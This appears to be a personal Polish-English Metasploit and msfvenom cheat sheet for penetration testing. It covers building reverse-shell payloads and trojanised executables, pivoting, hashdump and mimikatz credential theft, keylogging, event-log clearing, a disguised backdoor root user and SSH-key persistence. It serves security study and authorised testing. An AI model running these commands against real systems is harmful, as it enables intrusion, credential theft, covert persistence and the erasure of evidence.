

# MSFVENOM (payload)

https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html

**Tutorial:** https://www.hackingarticles.in/msfvenom-tutorials-beginners/
Ciekawe payloady: https://www.hackingarticles.in/fun-metasploit-payloads/

| msfvenom | what | msfvenom help |
| ---- | ---- | ---- |
| `-p ... LHOST=... LPORT=... ...`<br><br>automatyczna migracja do procesu<br>`prpendmigrateprocess=explorer.exe prependmigrate=true` | payloads | `msfvenom --list payloads`<br>`msfvenom --list-options -p ...` |
| `-f exe` | formats | `msfvenom --list formats` |
| `> file.exe`<br>`-o file.exe` | zapisz do pliku |  |
| `-e x86/shikata_ga_nai` <br>`-i 3` | encoders | `msfvenom --list encoders` |
| `-b '\x00\x0a\x0d\x20\xff'` | bad chars to avoid |  |
| `-x calc.exe` | custom template |  |
| `-k` | keep functionality of template |  |
| `--smallest` | generate smallest possible payload |  |


https://medium.com/@PenTest_duck/offensive-msfvenom-from-generating-shellcode-to-creating-trojans-4be10179bb86

## paylod z msfconsole

https://www.rapid7.com/blog/post/2020/12/23/metasploit-tips-and-tricks-for-haxmas-2020-2/#Skipping%20msfvenom's%20boot%20time

```bash
# omijanie msfvenom, generowanie payload z msfconsole
# Use the payload module:
use windows/meterpreter/reverse_https
set LHOST 127.0.0.1
set LPORT 4443
set SessionCommunicationTimeout 0
set ExitOnSession false

# Create the executable, as an alternative to msfvenom:
generate -o reverse_windows.exe -f exe

# Create a handler, as an alternative to exploit/multi/handler
to_handler / exploit -jq
```

## Własny shellcode zamiast metasploitowego payloadu

```bash
$ cat binshellcode.bin | msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f c -b '\x00'
-p - instructs msfvenom to read the custom payload from the stdin
--platform win: is used to specify the platform
-e x86/shikata_ga_nai: specifies the encoder to use
-f c: sets the output format (in this case C)
```

# Metasploit

https://reconshell.com/awesome-metasploit-collection/
**materiały:** https://www.offsec.com/metasploit-unleashed/

Metasploit custom modules, plugins, resource script and.. awesome metasploit collection
https://github.com/hahwul/mad-metasploit

**Interfejsy metasploit**

- msfconsole - interactive commandline
- Armitage - GUI do metasploit
- msfweb - webinterface

**folder** `ls -la /usr/share/metasploit-framework`  
**moduły** `/usr/share/metasploit-framework/modules`

- `Auxiliary` - Pozostałe moduły, np.: scanner
- `Exploits` - Exploity, implantuje payload na systemie
- `Payloads` - np reverse shell albo meterpreter, daje dostęp, daje dostęp do systemu
- `Encoders` - Pozwalają zasyzfrować exploit i payload.
- `NOPs` - NOPs (No OPeration), nie rób nic.
- `Post` - post-exploitation.
- `Evasion` - Pomaga obejść oprogramowanie antywirusowe.

| Penetration Testing Phase           | Metasploit Framework Implementation              |
| ----------------------------------- | ------------------------------------------------ |
| Information Gathering & Enumeration | Auxiliary Modules                                |
| Vulnerability Scanning              | Auxiliary Modules<br>Nessus                      |
| Exploitation                        | Exploit Modules & Payloads                       |
| Post Exploitation                   | Meterpreter                                      |
| Privilege Escalation                | Post Exploitation Modules<br>Meterpreter         |
| Maintaining Persistent Access       | Post Exploitation Modules<br>Persistence Modules |

# Fundamentals

```bash
$ service postgresql start # start postgres
$ msfdb init # initializes and creates the PostgreSQL database for Metasploit
$ msfconsole # start metasploit
db_status # status połączenia msfcli z DB
$ sudo msfdb status # status usługi bazy danych
```

# Workspaces

```bash
workspace # List workspaces
workspace [name] # Switch workspace
-a # Add a workspace
-d # Delete a workspace
-D # Delete all workspaces
-h # banner
-l # workspaces
-r # `<br>Rename a workspace
-S # Search for a workspace
-v # List workspaces verbosely
```

# Search Exploit

```bash
search linux shell reverse tcp x64 # szukanie modułu, np. listenera tcp do reverse shell
search type:exploit platform:windows type:exploits, payloads,... name:ftp
use <wynik_wyszukiwania>` # użyj liczby przypisanej do wyniku wyszukiwania lub pełnej nazwy
back # krok w tył
```

## Vulnerability Scanning

```bash
$ searchsploit "xxxx" | grep "Metasploit"


search type:exploit name:xxx
set payload ...

# metasploit plugin for easy exploit & vulnerability attack. https://github.com/hahwul/metasploit-autopwn
db_autopwn -p -t -PI 445
```

# Customizing Exploit

```bash
show info / options / advanced / missing / evasion / payloads 
set/setg ...
unset/unsetg ...
```

# Exploit The Vulnerable Service

```bash
multi/windows/local_exploit_suggester # exploit suggester
exploit # uruchomienie modułu
exploit -j # Run in the context of a job
exploit -q # Run the module in quiet mode with no output
exploit -J # Force running in the foreground, even if passive
```

# Pivoting

```bash
# w sesji meterpretera
post/multi/manage/autoroute # automatycznie dodaj wszystkie sieci dostepne na hoście

route # route table entries within Metasploit’s routing table
route remove 172.19.176.0/20 1 # remove a specific route<br>`route remove <IP ADDRESS OF SUBNET><NETMASK IN SLASH FORMAT> <GATEWAY>`
route flush # flush all routes from the routing table
route get 169.254.204.110 # check session the route will use

run autoroute -s 10.1.1.0 -n 255.255.255.0` # Add a route to 10.10.10.1/255.255.255.0
run autoroute -s 10.10.10.1 # Netmask defaults to 255.255.255.0
run autoroute -s 10.10.10.1/24 # CIDR notation is also okay
run autoroute -p # Print active routing table
run autoroute -d -s 10.10.10.1 # Deletes the 10.10.10.1/255.255.255.0 route
```
po pivotingu należy przeskanować nową sieć
https://www.giac.org/paper/gpen/3579/post-exploitation-metasploit-pivot-port/121704
`arp_scanner`
## SOCKS Proxy
```bash
$ cat /etc/proxychains4.conf # configure SOCKS4 proxy 
# make sure there is line socks4 127.0.0.1 9050

# run SOCKS proxy server
msf> use auxiliary/server/socks_proxy
msf> set SRVPORT 9050
msf> set VERSION 4a 
msf> exploit
msf> jobs

$ proxychains nmap ... # use proxychains
```

# Port Forwarding

```bash
portfwd list
portfwd flush
portfwd add 
        -l 3389 # local port that will be listening and forwarded to our target
        -p 3389 # destination port on our targeting host
        -r [target host] # targeted system’s IP or hostname
portfwd delete –l 3389
```

# Sessions

```bash
multi/manage/shell_to_meterpreter # mając sesję zwykła można przekształcić ją na meterpreter.
sessions -l # lista dostępnych sesji
sessions -i nr_sesji # interakcja z sesją/kożystaj z sesji
sessions -c cmd # wykonaj polecenie cmd we wszystkich dostępnych sesjach
sessions -i 10-20 -c "id" # wykonaj komendę w wybranych sesjach
sessions -k 1 # ubij sesję
background / Ctrl+z # wysłanie sesji w tło, wychodzi z sesji ale jej nie kończy, wraca do msfconsole
```

# Meterpreter

```bash
sessions -u nr_sesji # upgrade sesji do meterpreter
sysinfo # system info
getuid # display the user that the Meterpreter server is running as on the host
background / Ctrl+z # Backgrounds the current session
upload src dst ` # upload pliku do ofiary, używany w sesji, src- pełna ścieżka do pliku na maszynie atakującego, dst- ścieżka do pliku tworzonego u ofiary
shell # przełącza do shell, exit/CRTL+C aby wyjść z shella do meterpretera
download c:\\boot.ini # pobierz plik z ofiary do siebie
pgrep explorer # szukaj PID procesu o nazwie explorer
migrate 2444 # migracja do procesu
getsystem # Elevate to the high privileg
hashdump # dump hashy haseł
clearev # clear the Application, System, and Security logs on a Windows system
edit edit.txt # Vi editor
execute -f cmd.exe -i -H #
ipconfig # displays the network interfaces and addresses on the remote machine
getprivs #
exit # TERMINATE the meterpreter session
search -f Unattend.xml # szukaj pliku Unattend.xml
```

## Meterpreter Extensions

```bash
load <nazwa modułu>
    incognito # Access Token Impersonation
    kiwi # mimikatz dla msf
```

### kiwi

https://www.hackingarticles.in/metasploit-for-pentester-mimikatz/
![[tools/mimikatz#Mimikatz]]

### incognito

Impersonate user tokens when successfully compromising a system.

Once you have a Meterpreter session, you can impersonate valid tokens on the system and become that specific user without ever having to worry about credentials, or for that matter, even hashes

```PowerShell
$ msfconsole
...
load incognito # load module "incognito"
list_tokens -u  # Lists all accessible tokens and their privilege level
impersonate_token "ATTACKDEFENSE\\Administrator"
getuid
```

### Skrypty

https://www.offsec.com/metasploit-unleashed/existing-scripts/
https://www.hackers-arise.com/ultimate-list-of-meterpreter-scripts

folder ze skryptami: `/usr/share/metasploit-framework/scripts`  
skrypty w meterpreter : `/usr/share/metasploit-framework/scripts/meterpreter`  
`meterpreter > run getcountermeasure`

### Execute from Memory

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Metasploit%20-%20Cheatsheet.md#execute-from-memory

```PowerShell
execute -H -i -c -m -d calc.exe -f /root/wce.exe -a  -w
```

# Pluginy

https://docs.metasploit.com/docs/using-metasploit/intermediate/how-to-use-plugins.html

# Baza danych Metasploit

https://www.offsec.com/metasploit-unleashed/using-databases/

```bash
db_status # Show the current database status
db_connect # Connect to an existing database
db_import # Import a scan result file (filetype will be auto-detected)
db_nmap # skan nmap z uzupełnianiem bazy danych znlezionymi informacjami
creds # List all credentials in the database
hosts # List all hosts in the database
services # List all services in the database
jobs # pokaż exploity jakie aktualnie działają, np. tcp listener na danym porcie
kill # ubij job (np. listener, kiedy jakiś port jest zajęty)
```

## import z Nessus

https://www.makeuseof.com/how-to-install-nessus-kali-linux/

`New Scan`...
Wejść w wynik skanu
`Export`>`Nessus`(nie Nessus DB)

```bash
db_import /../report.nessus
vulns -p 445
search cve:2017 name:smb
```

## import z [[nmap]]

```bash
db_import ../raport.xml
```

# Payload Deploy

```bash
# module creates a server which hosts a payload
exploit/multi/script/webdelivery

# hosts an HTML Application (HTA) that when opened will run a payload via Powershell
exploit/windows/misc/hta_server
    (PowerShell)mshta.exe http://10.10.0.2:8080/6Nz7aySfPN.hta # w PS uruchamia aplikację
```

# resource scripts

https://docs.rapid7.com/metasploit/resource-scripts/

```bash
# Save used commands to a resource script
makerc ~/Desktop/myscript.rc
# Running resource scripts from Metasploit Framework
$ ./msfconsole -r <path to resource script>
msf > resource <path to resource script> [param 1] [param 2] [param 3]
```

# Inne

## Ciekawe moduły

```bash
auxiliary/spoof/
auxiliary/server/
```

## dumping creds

https://www.hackingarticles.in/metasploit-for-pentester-creds/

## hidden bind shell

https://www.hackingarticles.in/metasploit-for-pentester-windows-hidden-bind-shell/

## SSH

```bash
MSF
$ auxiliary/scanner/ssh/libssh_auth_bypass # exploits an authentication bypass in libssh server code
  set spawn_pty true

$ auxiliary/scanner/ssh/ssh_version
$ auxiliary/scanner/ssh/ssh_enumusers # SSH Username Enumeration, znajduje użytkowników
$ auxiliary/scanner/ssh/ssh_login # login bruteforce
```

## SMB

```bash
msf> use scanner/smb/smb_login # dict attack
msf> use scanner/smb/pipe_auditor
msf> use exploit/windows/smb/psexec # meterpreter po zalogowaniu
msf> use auxiliary/scanner/smb/smb_enumshares
msf> use auxiliary/scanner/smb/smb_enumusers
msf> use auxiliary/scanner/smb/smb_enumusers_domain
```

## HTTP

```bash
auxiliary/scanner/http/apache_userdir_enum
auxiliary/scanner/http/brute_dirs
auxiliary/scanner/http/dir_scanner
auxiliary/scanner/http/dir_listing
auxiliary/scanner/http/http_put
auxiliary/scanner/http/files_dir
auxiliary/scanner/http/http_login
auxiliary/scanner/http/http_header
auxiliary/scanner/http/http_version
auxiliary/scanner/http/robots_txt
```

```bash
# web application vulnerability scanner
load wmap

# trzeba korzystac w odpowiedniej kolejności
wmap_sites -a <IP>
wmap_targets -t http://IP
wmap_targets -l
wmap_run -t
wmap_run -e
wmap_vulns
```

```bash
msf5 > wmap_sites [options]
        -h        Display this help text
        -a [url]  Add site (vhost,url)
        -d [ids]  Delete sites (separate ids with space)
        -l        List all available sites
        -s [id]   Display site structure (vhost,url|ids) (level) (unicode output true/false)

msf5 > wmap_targets -h
[*] Usage: wmap_targets [options]
        -h              Display this help text
        -t [urls]       Define target sites (vhost1,url[space]vhost2,url)
        -d [ids]        Define target sites (id1, id2, id3 ...)
        -c              Clean target sites list
        -l              List all target sites

msf5 > wmap_run [options]
        -h                        Display this help text
        -t                        Show all enabled modules
        -m [regex]                Launch only modules that name match provided regex.
        -p [regex]                Only test path defined by regex.
        -e [/path/to/profile]     Launch profile modules against all matched targets.
                                  (No profile file runs all enabled modules.)
```

## MYSQL

```bash
auxiliary/scanner/mysql/mysql_version
auxiliary/scanner/mysql/mysql_login # bruteforce login
auxiliary/admin/mysql/mysql_enum
auxiliary/admin/mysql/mysql_sql
auxiliary/scanner/mysql/mysql_file_enum # enumeracja jakie pliki sitnieją na serwerze; wordlist - /usr/share/metasploit-framework/data/wordlists/sensitive_files.txt oraz  /usr/share/metasploit-framework/data/wordlists/directory.txt
auxiliary/scanner/mysql/mysql_hashdump # dump hashy użytkowników
auxiliary/scanner/mysql/mysql_schemadump # Dump the schema of all databases from the server
auxiliary/scanner/mysql/mysql_writable_dirs # enumeracja które foldery są writable; wordlist - /usr/share/metasploit-framework/data/wordlists/directory.txt
```

## MSSQL

```bash
auxiliary/scanner/mssql/mssql_login
auxiliary/admin/mssql/mssql_enum
auxiliary/admin/mssql/mssql_enum_sql_logins
auxiliary/scanner/mssql/mssql_hashdump
auxiliary/admin/mssql/mssql_exec
auxiliary/admin/mssql/mssql_enum_domain_accounts
```

## SMTP

```bash
auxiliary/scanner/smtp/smtp_version # SMTP Banner Grabber
auxiliary/scanner/smtp/smtp_enum # SMTP User Enumeration Utility
```

## Apache Tomcat

```bash
exploit/multi/http/tomcat_jsp_upload_bypass
set payload java/jsp_shell_bind_tcp
set shell cmd # dla Windows

msfvenom -p windows/x64/meterpreter_reverse_tcp Lhost=10.10.18.6 Lport=1234 -f exe > payload.exe
python3 -m http.server

use multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set Lhost=10.10.18.6
set Lport=1234
exploit -jq
```

## FTP

```bash
exploit/unix/ftp/vsftpd_234_backdoor
```

# Windows Postexploitation

## Meterpreter

```bash
getuid
systinfo
getsystem
show_mount
ps
getprivs
```

## msf>search post/windows/(gather)...

|                                         |                                            |
| --------------------------------------- | ------------------------------------------ |
| Enumerate user privileges               | `post/windows/gather/win_privs`            |
| Enumerate logged on users               | `post/windows/gather/enum_logged_on_users` |
| Enum unattended installation file       | `post/windows/gather/enum_unattend`        |
| VM check                                | `post/windows/gather/checkvm`              |
| Enumerate installed programs            | `post/windows/gather/enum_applications`    |
| Enumerate AVs                           | `post/windows/gather/enum_av_excluded`     |
| Enumerate computers connected to domain | `post/windows/gather/enum_computers`       |
| Enumerate installed patches             | `post/windows/gather/enum_patches`         |
| Enumerate shares                        | `post/windows/gather/enum_shares`          |
| enable RDP on target                    | `post/windows/manage/enable_rdp`           |

## Privilege escalation

## Windows Persistence

https://www.hackingarticles.in/multiple-ways-to-persistence-on-windows-10-with-metasploit/

```bash
exploit/windows/local/persistence_service
# set payload windows/meterpreter/reverse_tcp

use multi/handler
set payload windows/meterpreter/reverse_tcp # jak w exploicie wyżej
...
exploit
# opcje payload muszą być takie same
```

## Bypas UAC

https://www.hackingarticles.in/multiple-ways-to-bypass-uac-using-metasploit/

## Enabling RDP

pozwala dodać użytkownika ale nie trzeba

```bash
post/windows/manage/enable_rdp
```

## Windows Keylogging

```bash
# meterpreter
pgrep explorer # keystroke capture nie zawsze działa z innymi procesami
migrate 1234
keyscan_start # zacznij przechwytywanie
keyscan_dump # pokaż co przechwycono
keyscan_stop # koniec przechwytywania, nie zapisuje sie nigdzie
```

## Clearing Windows Event Logs

Event logs :

- Application logs: Stores application/program events like startups, crashes etc.
- System logs: Stores system events like startups, reboots etc.
- Security logs: Stores security events like password changes, authentication failures etc

Event logs can be accessed via the **Event Viewer on Windows**

```bash
clearev
```

# Linux Postexploitation

## msf>search post/linux/(gather)...

zrobic szybki skrypt .rc

1. setg session 1
1. use ...skrypt
1. dodac exploit po każdym skrypcie
   ```bash
   use post/linux/gather/enum_configs
   exploit
   use post/multi/gather/env
   exploit
   ...
   ```

|                                                                                                                       |                                        |
| --------------------------------------------------------------------------------------------------------------------- | -------------------------------------- |
| Enumerate system configuration                                                                                        | `post/linux/gather/enum_configs`       |
| enumerate operating system environment variabless                                                                     | `post/multi/gather/env`                |
| Enumerate network configuration                                                                                       | `post/linux/gather/enum_network`       |
| check protection systems                                                                                              | `post/linux/gather/enum_protections`   |
| gather system and user information                                                                                    | `post/linux/gather/enum_system`        |
| container check                                                                                                       | `post/linux/gather/checkcontainer`     |
| VM check                                                                                                              | `post/linux/gather/checkvm`            |
| Enumerate all users history of commands                                                                               | `post/linux/gather/enum_users_history` |
| create a Reverse TCP Shell on the target system using the system's own scripting environments installed on the target | `post/multi/manage/system_session`     |
| downloads and runs a file with bash                                                                                   | `post/linux/manage/download_exec`      |
| **...**                                                                                                               | **...**                                |

## Linux Persistence

```bash
# ręczne dodanie użytkownika jako backdoor
useradd -m ftp -s /bin/bash
# nadanie hasła utworzonemu użytkownikowi
passwd ftp
    >password123
# sprawdzenie w jakich grupach jest root
groups root
# dodanie użytkownika z ftp do grupy root
usermod -aG root ftp
# sprawdzenie w jakich grupach jest użytkownik ftp
grups ftp
# zmiana id użytkownika ftp aby nie rzucał się w oczy
usermod -u 15 ftp
# mozna zmienic jeszcze kolejność w pliku /etc/passwd
```

```bash
# METASPLOIT
search persistence # wiele róznych mozliwości
use post/linux/manage/sshkey_persistence
set CREATESSHFOLDER true
chmod 0400 /.../loot/ssh_key # zmiana uprawnień pliku utworzonego w loot, pozwala zalogowac się za jego pomocą
```
